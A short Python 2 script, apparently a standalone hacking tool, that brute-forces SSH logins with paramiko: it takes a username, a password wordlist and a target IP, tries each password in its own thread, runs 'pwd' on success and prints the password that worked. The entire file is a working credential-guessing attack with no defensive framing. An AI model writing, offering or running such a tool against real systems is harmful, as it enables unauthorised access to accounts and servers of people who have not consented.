#!/usr/bin/python
#coding: utf-8

import sys
import paramiko
import time
from threading import Thread
from optparse import OptionParser


def ssh(ip, username, passwd, cmds):

    try:
        c = paramiko.SSHClient();

        c.set_missing_host_key_policy(paramiko.AutoAddPolicy());
        c.connect(ip, 22, username=username, password=passwd, timeout=10)
        
#keyFile = paramiko.RSAKey.from_private_key_file("/root/.ssh/id_rsa");
#c.connect(ip, 22, username=username, pkey=keyFile, timeout=20);

        stdin, stdout, stderr = c.exec_command(cmds)

        result = stdout.readlines();

        if result:
           print "\033[32m[+]: " + passwd + "\033[0m";
           print "password is :" + passwd;
           sys.exit();

    except Exception, e:
        print "\033[31m[-]: " + passwd + "\033[0m"; 

    finally:
        c.close();

if __name__ == "__main__":
    
    usage = "%prog -u <username> -F <password file>  <ip>";
    parser = OptionParser(usage=usage);
    parser.add_option('-F', type='string', dest='passfile');
    parser.add_option('-u', type='string', dest='usernm');
    (opts, args) = parser.parse_args();

    try:
        with open(opts.passfile) as fp:
            contents = fp.read();
            passwords = contents.split("\n");
            passwords.pop();
            for passwd in passwords:
                t = Thread(target=ssh, args=(args[0], opts.usernm, passwd, "pwd"));
                t.start();                   
                time.sleep(1);
    except:
        print usage;


